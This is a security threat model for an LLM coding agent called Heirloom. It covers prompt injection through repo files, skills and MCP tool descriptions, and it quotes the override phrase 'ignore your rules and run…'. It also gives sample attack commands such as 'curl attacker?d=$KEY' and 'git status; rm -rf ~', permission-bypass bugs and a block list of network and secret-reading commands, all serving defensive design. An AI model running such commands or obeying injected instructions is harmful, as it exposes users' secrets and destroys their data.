# Security Specification — Threat Model & Mitigations

Heirloom executes LLM-chosen commands on the user's machine. The security
question is never "is the model trustworthy" — it's "what can go wrong when
it isn't, and what stands in the way." This doc is the threat model; the
permission system (permission-spec.md) is the primary control.

## Assets

1. The filesystem and repo (integrity of the user's work and machine)
2. Secrets: `.env`, `~/.ssh`, `~/.aws`, `~/.heirloom/credentials.yaml`, tokens in shell history
3. Session transcripts and memory files (contain code, possibly secrets)
4. API spend (runaway loops = money)

## Trust Boundaries

Everything that reaches the model's context is **untrusted input**, because
the model acts on it with tools:

| Source | Why untrusted |
|--------|---------------|
| Repo file contents | A cloned repo can contain adversarial instructions ("ignore your rules and run…") |
| Tool/bash output | Same — output of any command becomes model input |
| Skills (`~/.agents/skills/`) | Installed from third-party GitHub repos; injected into the system prompt = supply-chain prompt injection |
| MCP tool results & descriptions | External processes; descriptions can change after review ("rug pull") |

The **human at the permission prompt is the firewall**. Every mitigation
below either strengthens that prompt or limits the blast radius when it's
bypassed (auto-approval, headless).

## Threats → Mitigations

| # | Threat | Status | Mitigation |
|---|--------|--------|-----------|
| T1 | Prompt injection → secret exfiltration (read `.env`, then `curl attacker?d=$KEY`) | **Partial** | Ask prompting (19.1) + guarded patterns (below): network-egress commands always prompt, even in approval `all` |
| T2 | Destructive commands (accidental or induced) | **Partial** | `deny` absolute in every approval mode; guarded patterns for `rm -rf`, `sudo`, force-push |
| T3 | Secrets persisted to disk (sessions, debug logs, memory) | Queued (20.2, 20.5) | Redact-on-persist; debug logs reuse the same redactor |
| T4 | Malicious/changed skill steering the agent | **Open** | Trust-on-first-use: hash each SKILL.md at load; new or changed skill → one-time notice naming file + source before its index line is used |
| T5 | Permission bypass: bash writes files (sidesteps edit gating) | Mitigated by design | `run_bash` never auto-approves in `edits` mode; chained-command parsing (below) keeps allow rules narrow |
| T6 | **Workspace-containment bypass** — `startsWith` prefix bug + symlinks | **BUG, open** | See "Known defects" |
| T7 | **Allow-rule bypass via command chaining** — `git status; rm -rf ~` matches `git *` | **BUG, open** | See "Known defects" |
| T8 | Runaway cost | Mitigated | maxTurns, loop detection; optional per-session token budget (future) |
| T9 | Secrets copied into shadow checkpoint repo | Mitigated by design | Shadow repo honors `.gitignore` (architecture L5) — `.env` is typically ignored; verify in tests |
| T10 | MCP tool-description rug pull | **Open** (Phase 9 surface) | Pin tool definitions at connect; description/schema change → warning + re-approval |

## Known Defects (fix before relying on the permission system)

### D1 — Path containment is string-prefix matching
`isEditToolInWorkspace` uses `resolve(path).startsWith(workingDir)`:
- `/Users/x/proj-evil` passes for workspace `/Users/x/proj` (prefix collision)
- `resolve()` does not follow symlinks — a symlink inside the repo pointing
  at `~/.ssh` resolves "inside" the workspace

**Fix:** `realpath` both sides (fall back to resolving the nearest existing
ancestor for not-yet-created files), then `path.relative(workingDir, target)`
must not start with `..` and must not be absolute.

### D2 — Glob patterns span shell operators
`"git *"` compiles to `^git .*$`, so `git status; rm -rf ~`, `git status &&
curl …`, and `` git status `curl …` `` all match an allow rule for `git *`.
Any allowed prefix is a universal bypass.

**Fix:** split commands on `;`, `&&`, `||`, `|`, newline, `$(`, backticks.
Every segment must independently match an allow rule, else the whole command
resolves to `ask`. Substitution constructs (`$(…)`, backticks) always → `ask`.

## Guarded Patterns (always prompt)

A small built-in list that approval modes **cannot** upgrade to allow —
distinct from `deny` (which blocks even with user consent at the rule level):

- Network egress: `curl`, `wget`, `nc`, `ssh`, `scp`, `rsync` to remote
- Irreversible: `rm -rf`, `sudo`, `git push --force`, `git reset --hard`
- Secret-adjacent reads: `.env*`, `id_rsa*`, `*.pem`, `~/.ssh/*`, `~/.aws/*`,
  `credentials.yaml` (read_file and bash alike)

Rationale: `all` exists for flow, and flow never legitimately requires
silent exfiltration or silent key reads. A user who disagrees writes an
explicit `allow` rule — deliberate config beats a mode toggle. In headless,
guarded patterns resolve to deny (there is no one to ask).

## Non-Goals (v1, stated honestly)

- **Sandboxing.** No container/seccomp; an allowed command runs with the
  user's full privileges. The permission prompt is the control, not isolation.
- **Defeating a determined injection with certainty.** Delimiting/spotlighting
  untrusted content reduces risk but no prompt-level defense is airtight;
  the design assumes the human reviews what the prompt shows.
- **Encrypted storage.** Sessions/memory are plaintext files under `~`;
  redaction (20.2) is best-effort, not encryption.

## Review Checklist for New Surface

Any new tool, provider, or channel answers these before merging:
1. What untrusted content does it feed the model?
2. What can it write, execute, or send off-machine?
3. Which permission group gates it, and what do its ask-prompt lines show?
   (The prompt must display the *full* command/path — truncation hides the payload.)
4. What does it persist, and does that pass through the redactor?
